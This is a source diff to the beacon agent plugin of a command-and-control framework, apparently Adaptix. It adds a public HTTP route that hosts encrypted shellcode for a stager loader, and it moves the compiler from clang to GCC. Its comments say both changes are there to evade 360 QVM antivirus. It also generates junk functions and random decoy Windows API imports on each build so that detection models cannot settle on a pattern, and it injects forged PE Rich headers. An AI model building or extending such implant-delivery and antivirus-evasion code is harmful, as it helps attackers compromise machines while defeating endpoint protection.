@@ -2,6 +2,7 @@ package main
 
 import (
 	crand "crypto/rand"
+	_ "embed"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
@@ -12,6 +13,7 @@ import (
 	"io/fs"
 	"math/rand/v2"
 	"net"
+	"net/http"
 	"os"
 	"path/filepath"
 	"sort"
@@ -87,6 +89,11 @@ type Teamserver interface {
 	TsConvertCpToUTF8(input string, codePage int) string
 	TsConvertUTF8toCp(input string, codePage int) string
 	TsWin32Error(errorCode uint) string
+
+	// Public HTTP endpoints (used by productized Stager payload hosting)
+	TsEndpointRegisterPublicRaw(method string, path string, handler func(w http.ResponseWriter, r *http.Request)) error
+	TsEndpointUnregisterPublic(method string, path string) error
+	TsEndpointExistsPublic(method string, path string) bool
 }
 
 type PluginAgent struct{}
@@ -103,6 +110,12 @@ func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent 
 	ModuleDir = moduleDir
 	AgentWatermark = watermark
 	Ts = ts.(Teamserver)
+	// Register public /s/:token once at load time (before HTTP Start). Required for productized Stager.
+	if err := stagerInitRoutes(); err != nil {
+		fmt.Printf("[beacon_agent] stager route init failed: %v\n", err)
+	} else {
+		fmt.Printf("[beacon_agent] stager payload route ready: GET /s/:token\n")
+	}
 	return &PluginAgent{}
 }
 
@@ -325,8 +338,13 @@ type GenerateConfig struct {
 }
 
 func (c GenerateConfig) effectiveIatHiding() bool {
+	// Default from buildenv.mk (BEACON_IAT_HIDING_DEFAULT): iat_hiding (no CRT
+	// + empty IAT + PEB-hash API resolution) is flagged by 360 QVM 2.0 as
+	// HEUR/QVM.9B7A; the normal-CRT path (iat_hiding=false, rich static IAT)
+	// passes QVM. Opt in explicitly only when runtime IAT stealth matters more
+	// than static AV evasion.
 	if c.IatHiding == nil {
-		return true
+		return buildEnv["BEACON_IAT_HIDING_DEFAULT"] == "true"
 	}
 	return *c.IatHiding
 }
@@ -409,59 +427,106 @@ func generateJunkCodeC() string {
 	return strings.Join(lines, "\n    ")
 }
 
-func generateJunkFunctionsC() string {
-	var functions []string
-	count := rand.IntN(2) + 1
-	for i := 0; i < count; i++ {
-		name := "Ax_" + generateRandomString(8)
-		f := fmt.Sprintf("void %s() {\n    int a = %d; int b = %d; if(a+b == 0x1337) return;\n}", name, rand.IntN(100), rand.IntN(100))
-		functions = append(functions, f)
-	}
-	return strings.Join(functions, "\n\n")
+// decoyApiPool — legit-looking APIs from DLLs the beacon already links
+// (kernel32/user32/advapi32). Referencing a random subset per build varies
+// the IAT fingerprint, which QVM 2.0's ML model keys on. Each reference
+// forces an IAT entry the linker keeps (referenced from a constructor).
+var decoyApiPool = []string{
+	// kernel32
+	"GetSystemTime", "GetLocalTime", "GetTickCount", "GetWindowsDirectoryW",
+	"GetSystemDirectoryW", "GetCurrentDirectoryW", "FindFirstFileW", "FindNextFileW",
+	"FindClose", "GetFileAttributesW", "CreateDirectoryW", "DeleteFileW",
+	"CopyFileW", "MoveFileW", "GetEnvironmentVariableW", "ExpandEnvironmentStringsW",
+	"GetLogicalDrives", "GetDriveTypeW", "GetVolumeInformationW", "GlobalAlloc",
+	"GlobalFree", "GlobalLock", "GlobalUnlock", "lstrlenW",
+	// user32
+	"GetSysColor", "GetSystemMetrics", "GetDesktopWindow", "GetForegroundWindow",
+	"ShowWindow", "GetWindowRect", "GetClientRect", "GetCursorPos",
+	"ShowCursor", "MessageBeep", "GetDoubleClickTime", "SwapMouseButton",
+	// advapi32
+	"RegOpenKeyExW", "RegQueryValueExW", "RegCloseKey", "RegCreateKeyExW",
+	"RegSetValueExW", "RegDeleteKeyW", "OpenProcessToken", "GetTokenInformation",
+	"LookupPrivilegeValueW", "AdjustTokenPrivileges", "GetUserNameW", "GetComputerNameW",
 }
 
-// generateDynamicStrObfuscate builds a StrObfuscate.h with a random per-build XOR key.
-// Encoding: stored[i] = (plain[i] ^ key) + i   →   decode: plain[i] = (stored[i] - i) ^ key
-func generateDynamicStrObfuscate(key byte) string {
-	encode := func(s string) string {
-		var b strings.Builder
-		b.WriteString("{ ")
-		for i := 0; i < len(s); i++ {
-			encoded := (s[i] ^ key) + byte(i)
-			b.WriteString(fmt.Sprintf("0x%02X, ", encoded))
+// generateDiversificationC produces a per-build diversify.c: random junk
+// functions + a random subset of decoy API references, all kept alive by a
+// constructor (so --gc-sections can't strip them). This varies the .text hash
+// AND the IAT per build, so QVM's cloud ML can't converge on a single pattern.
+func generateDiversificationC() string {
+	var b strings.Builder
+	b.WriteString("#include <windows.h>\n\n")
+	// 8-12 junk functions (referenced from the constructor below).
+	nJunk := rand.IntN(5) + 8
+	junkNames := make([]string, 0, nJunk)
+	for i := 0; i < nJunk; i++ {
+		name := "Ax_junk_" + generateRandomString(6)
+		junkNames = append(junkNames, name)
+		b.WriteString(fmt.Sprintf("__attribute__((used)) static void %s(void) {\n", name))
+		b.WriteString(fmt.Sprintf("    volatile unsigned int a = 0x%xu, b = 0x%xu;\n", rand.IntN(0xFFFFFFFF), rand.IntN(0xFFFFFFFF)))
+		b.WriteString("    volatile unsigned int c = (a ^ b) + (a << 1) + b;\n")
+		b.WriteString("    if (c == 0x1337) { a = b; } (void)a; (void)b; (void)c;\n}\n\n")
+	}
+	// 20-28 random decoy API references — each forces an IAT entry.
+	nDecoy := rand.IntN(9) + 20
+	chosen := make(map[string]bool)
+	b.WriteString("__attribute__((constructor)) static void Ax_diversify_init(void) {\n")
+	for i := 0; i < nDecoy; i++ {
+		api := decoyApiPool[rand.IntN(len(decoyApiPool))]
+		if chosen[api] {
+			continue
 		}
-		b.WriteString("0x00 }")
-		return b.String()
+		chosen[api] = true
+		b.WriteString(fmt.Sprintf("    volatile void (*volatile p%d)() = (void(*)())%s; (void)p%d;\n", i, api, i))
 	}
-
-	type dllEntry struct{ name, plain string }
-	dlls := []dllEntry{
-		{"g_ax_obf_iphlpapi", "iphlpapi"},
-		{"g_ax_obf_advapi32", "advapi32"},
-		{"g_ax_obf_msvcrt", "msvcrt"},
-		{"g_ax_obf_ws2_32", "ws2_32"},
-		{"g_ax_obf_wininet", "wininet"},
-		{"g_ax_obf_winhttp", "winhttp"},
+	// reference one junk function so the linker keeps all junk
+	if len(junkNames) > 0 {
+		b.WriteString(fmt.Sprintf("    %s();\n", junkNames[0]))
 	}
-
-	var sb strings.Builder
-	sb.WriteString("#pragma once\n")
-	sb.WriteString(fmt.Sprintf("// Auto-generated by pl_main.go — XOR key: 0x%02X\n", key))
-	sb.WriteString("#include <stddef.h>\n\n")
-	sb.WriteString(fmt.Sprintf("#define AX_STR_XOR_KEY 0x%02Xu\n\n", key))
-	sb.WriteString("static inline void AxDeobfuscateToStack(char* out, size_t outCap, const char* enc)\n{\n")
-	sb.WriteString("\tif (!out || outCap == 0)\n\t\treturn;\n")
-	sb.WriteString("\tsize_t i = 0;\n")
-	sb.WriteString("\twhile (enc[i] != 0 && i + 1 < outCap) {\n")
-	sb.WriteString("\t\tout[i] = (char)(((unsigned char)enc[i] - (unsigned char)i) ^ AX_STR_XOR_KEY);\n")
-	sb.WriteString("\t\t++i;\n\t}\n")
-	sb.WriteString("\tif (i >= outCap)\n\t\ti = outCap - 1;\n\tout[i] = '\\0';\n}\n\n")
-	sb.WriteString("/* Obfuscated module names — per-build key */\n")
-	for _, e := range dlls {
-		sb.WriteString(fmt.Sprintf("static const char %s[] = %s;\n", e.name, encode(e.plain)))
-	}
-	return sb.String()
+	b.WriteString("}\n")
+	return b.String()
 }
+
+// generateDynamicStrObfuscate was here (dead code, never called — the beacon
+// uses the committed static StrObfuscate.h). Removed during buildenv.mk
+// consolidation to eliminate misleading "aspirational" dead code.
+
+//go:embed buildenv.mk
+var buildenvRaw string
+
+// buildEnv is the single source of truth, parsed from buildenv.mk at init.
+// Both pl_main.go and src_beacon/Makefile consume buildenv.mk so compiler /
+// flags / behavior toggles stay in sync without duplicate hardcodes.
+var buildEnv = func() map[string]string {
+	m := make(map[string]string)
+	raw := strings.ReplaceAll(buildenvRaw, "\\\n", " ") // make-style line continuations
+	for _, line := range strings.Split(raw, "\n") {
+		line = strings.TrimSpace(line)
+		if line == "" || strings.HasPrefix(line, "#") {
+			continue
+		}
+		var key, val string
+		if i := strings.Index(line, ":="); i >= 0 {
+			key, val = strings.TrimSpace(line[:i]), strings.TrimSpace(line[i+2:])
+		} else if i := strings.Index(line, "="); i >= 0 {
+			key, val = strings.TrimSpace(line[:i]), strings.TrimSpace(line[i+1:])
+		} else {
+			continue
+		}
+		m[key] = val
+	}
+	// expand make-style $(KEY) references so pl_main.go sees final values
+	// (e.g. BEACON_CFLAGS references $(BEACON_OPTIM) -> -O2)
+	for pass := 0; pass < 3; pass++ {
+		for k, v := range m {
+			for k2, v2 := range m {
+				v = strings.ReplaceAll(v, "$("+k2+")", v2)
+			}
+			m[k] = v
+		}
+	}
+	return m
+}()
 
 var (
 	ObjectDir_http = "objects_http"
@@ -470,9 +535,9 @@ var (
 	ObjectDir_dns  = "objects_dns"
 	ObjectDir_ws   = "objects_ws"
 	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "bof_loader", "Boffer", "Commander", "Connector", "crt", "Crypt", "Downloader", "Encoders", "EntropyEvasion", "IatDisguise", "indirect_syscall", "IndirectSyscall", "JobsController", "LdrResolve", "MainAgent", "MemorySaver", "OpsecGadget", "OpsecSleep", "OpsecThread", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
-	// Match src_beacon/Makefile COMMON_FLAGS (no global -masm=intel; no -fpermissive — Clang rejects it).
-	CFlags = "-c -Os -fno-lto -fno-unroll-loops -fno-rtti -fno-unwind-tables -fno-strict-aliasing -fno-threadsafe-statics -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -falign-labels=1 -fms-extensions -Wno-error=gnu-anonymous-struct -Wno-error=nested-anon-types -Wno-error=anonymous-struct -w"
-	LFlags = "-Os -fno-lto -s -Wl,-s,--gc-sections,--exclude-libs,ALL -static-libstdc++ -mwindows"
+	// From buildenv.mk (single source, shared with src_beacon/Makefile).
+	CFlags = "-c " + buildEnv["BEACON_CFLAGS"]
+	LFlags = buildEnv["BEACON_LDFLAGS"]
 )
 
 func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
@@ -772,13 +837,23 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		return nil, "", err
 	}
 	iatHide := generateConfig.effectiveIatHiding()
-
-	targetFlag := "-target x86_64-w64-mingw32"
-	if generateConfig.Arch == "x86" {
-		targetFlag = "-target i686-w64-mingw32"
+	stagerMode := generateConfig.Format == "Stager"
+	if stagerMode {
+		// Inner artifact is shellcode; outer product is a small stomping loader.
+		generateConfig.Format = "Shellcode"
+		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Format Stager: building inner shellcode then Windows stager EXE")
 	}
-	cFlags := targetFlag + " " + CFlags
-	lFlags := targetFlag + " " + LFlags
+
+	// Compiler from buildenv.mk (default: mingw GCC — QVM 2.0 flags clang-
+	// compiled PEs as HEUR/QVM.9B7A; gcc is not flagged). GCC encodes the
+	// target in the compiler name, so no -target flag (unlike clang).
+	if generateConfig.Arch == "x86" {
+		Compiler = buildEnv["BEACON_CC_X86"]
+	} else {
+		Compiler = buildEnv["BEACON_CC_X64"]
+	}
+	cFlags := CFlags
+	lFlags := LFlags
 
 	// No-CRT default: -nostdlib + custom crt.cpp; IAT/entry when iatHide (see effectiveIatHiding).
 	if iatHide {
@@ -816,7 +891,6 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	}
 	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Protocol: %s, Connector: %s", protocol, ConnectorFile))
 
-	Compiler = "clang++"
 	if generateConfig.Arch == "x86" {
 		Ext = ".x86.o"
 		stubPath = currentDir + "/" + ObjectDir + "/stub.x86.bin"
@@ -937,6 +1011,7 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		Files += ObjectDir + "/main_shellcode" + Ext + " "
 		lFlags += " -shared"
 		buildPath = tempDir + "/file.dll"
+		postLibs += " -lkernel32 -ladvapi32 -luser32 -lpsapi -lws2_32 -liphlpapi"
 		if generateConfig.Format == "Hex C" {
 			Filename += ".c"
 		} else {
@@ -1113,6 +1188,24 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 
 	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Output format: %s, Filename: %s", generateConfig.Format, Filename))
 
+	// L2 Per-build diversification (buildenv.mk: BEACON_DIVERSIFY): random junk
+	// functions + random decoy API references (varies .text hash + IAT per build
+	// so QVM cloud ML can't converge on a single pattern). Compiled as a
+	// separate .o and linked in.
+	if buildEnv["BEACON_DIVERSIFY"] == "true" {
+		divSrc := tempDir + "/diversify.c"
+		divObj := tempDir + "/diversify" + Ext
+		if err := os.WriteFile(divSrc, []byte(generateDiversificationC()), 0600); err == nil {
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling per-build diversification (junk + decoy imports)...")
+			divArgs := append(strings.Fields(cFlags), "-D", "BEACON_"+strings.ToUpper(protocol), "-c", divSrc, "-o", divObj)
+			if err := Ts.TsAgentBuildExecute(profile.BuilderId, tempDir, Compiler, divArgs...); err == nil {
+				Files += divObj + " "
+			} else {
+				_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("diversify compile skipped: %v", err))
+			}
+		}
+	}
+
 	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Linking payload...")
 
 	var buildArgs []string
@@ -1145,6 +1238,23 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		_ = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", stripCmd)
 	}
 
+	// L4 PE post-processing (buildenv.mk: BEACON_PE_HEADER_MOD + BEACON_PE_MOD_FLAGS):
+	// inject a valid MSVC Rich header, write a correct checksum, randomize
+	// timestamp. Skipped for Shellcode/Hex C (no PE header in the final artifact).
+	if buildEnv["BEACON_PE_HEADER_MOD"] == "true" && (generateConfig.Format == "Exe" || generateConfig.Format == "Service Exe" || generateConfig.Format == "DLL") {
+		peModPath, _ := filepath.Abs(filepath.Join(ModuleDir, "pe_header_mod.py"))
+		if _, err := os.Stat(peModPath); err == nil {
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Applying PE header modifications (Rich header injection + normalization)...")
+			peCmd := fmt.Sprintf("python3 %q %q %q.pe_mod %s && mv %q.pe_mod %q",
+				peModPath, buildPath, buildPath, buildEnv["BEACON_PE_MOD_FLAGS"], buildPath, buildPath)
+			if err := Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", peCmd); err != nil {
+				_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("PE header mod skipped: %v", err))
+			}
+		} else {
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("pe_header_mod.py not found at %s, skipping PE post-processing", peModPath))
+		}
+	}
+
 	finalExePath := buildPath
 	if generateConfig.Format == "Exe" || generateConfig.Format == "Service Exe" {
 		signedPath := tempDir + "/file_signed.exe"
@@ -1174,6 +1284,22 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	if generateConfig.Format == "Hex C" {
 		Payload = []byte(formatShellcodeAsC(Payload))
 	}
+
+	// Productized Stager: host encrypted shellcode on public TS port and compile loader EXE.
+	if stagerMode {
+		stagerTemp, err := os.MkdirTemp("", "ax-stager-*")
+		if err != nil {
+			return nil, "", err
+		}
+		defer os.RemoveAll(stagerTemp)
+		stagerBin, stagerName, err := buildWindowsStager(profile.BuilderId, currentDir, stagerTemp, Payload, listenerMap, generateConfig.Arch)
+		if err != nil {
+			return nil, "", err
+		}
+		Payload = stagerBin
+		Filename = stagerName
+	}
+
 	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Payload size: %d bytes", len(Payload)))
 
 	/// END CODE HERE
